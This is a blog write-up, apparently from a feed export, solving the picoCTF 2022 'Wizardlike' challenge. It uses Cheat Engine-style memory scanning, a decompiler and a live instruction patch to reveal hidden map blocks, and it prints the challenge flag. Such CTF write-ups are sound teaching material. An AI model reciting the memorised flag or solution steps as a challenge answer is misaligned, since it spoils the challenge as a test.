      "url": "https://cramik.de/posts/picoctf-2022-wizardlike-unique/",
      "title": "PicoCTF 2022 Wizardlike &quot;Unique Solution&quot;",
      "content_html": "<p>An arguably lazy solution to Wizardlike</p>\n<p>Requirements:<br>\nCheat Engine/Lunar Engine<br>\nceserver for linux<br>\nSome decompiler</p>\n<p>I'm lazy and cheat in videos games so my first intuition was to find the x and y coord values in lunar engine and set these to complete the challenges. You can do this by searching for an all type unknown value and re-searching for when you expect it to change (when you move) and when you don't expect it to change (standing still) to find the correct values. Doing this provides us with two 4 byte values at game+132F70 and game+132F74 (x, y).</p>\n<p>However, after doing this and getting through the first couple of levels it becomes apparent that the ctf writer predicted this and made difficult to navigate levels with hidden objects to prevent this.</p>\n<p>In order to find the hidden objects, you are expected to reverse the function for revealing hidden blocks. One way to do this is to start out by using Lunar Engine again to search for unknown value, this time being some block's visibility. I ended up finding a 4 byte value at game+136E4C.</p>\n<p><img src=\"../../img/wizardlike-blockvisibility.webp\" alt=\"Screenshot of Lunar Engine Table\"></p>\n<p>Furthering this path, we can connect Lunar Engine's debugger via the &quot;Find out what access this address&quot; feature in order to find the instructions involved in revealing the block, 00402A0E for setting it to visible and 00401E82 for setting it to not visible.</p>\n<p><img src=\"../../img/wizardlike-whataccesses.webp\" alt=\"Screenshot of the What Accesses Table\"></p>\n<p>From here, you can go to your decompiler in order to find the instruction at 00402A0E and the decompiled code for it. Doing this, we see that there is &quot;else if&quot; logic that checks whether the block is already visible and whether a function returns true. We can assume that this function likely is a check for visibility or choose to further read other parts of the code to discern the logic.</p>\n<p><img src=\"../../img/wizardlike-ifelse.webp\" alt=\"Screenshot of the decompiled if else statement in IDA Pro\"></p>\n<p>When we view the function, we can spot that there are only two sections where the function returns 0, making the block not visible. The instruction addresses for these two return values are 0000210A and 0000204A. We can go back to Lunar Engine, go to its Memory View, find the instruction using Ctrl+G and game+204A, and double click the instruction to patch it live with the value of 1.</p>\n<p><img src=\"../../img/wizardlike-idareturn.webp\" alt=\"Screenshot of the return calls in IDA Pro\"><br>\n<img src=\"../../img/wizardlike-patch-one.webp\" alt=\"Screenshot of finding the address in Lunar Engine\"><br>\n<img src=\"../../img/wizardlike-patch-two.webp\" alt=\"Screenshot of patched code in Lunar Engine\"></p>\n<p>Finally, we can check our work by moving around and find the entire map we are on is now visible. This allows us to go between the levels now and view the flag, picoCTF{ur_4_w1z4rd_8F4B04AE} (for an added bonus you can also find the 4 byte map value to avoid having to walk in-between levels)</p>\n<p><img src=\"../../img/wizardlike-level8.webp\" alt=\"Screenshot of level 8\"><br>\n<img src=\"../../img/wizardlike-level2.webp\" alt=\"Screenshot of level 2\"></p>\n",
      "date_published": "2023-01-16T00:00:00+00:00"
    }
  ]
}
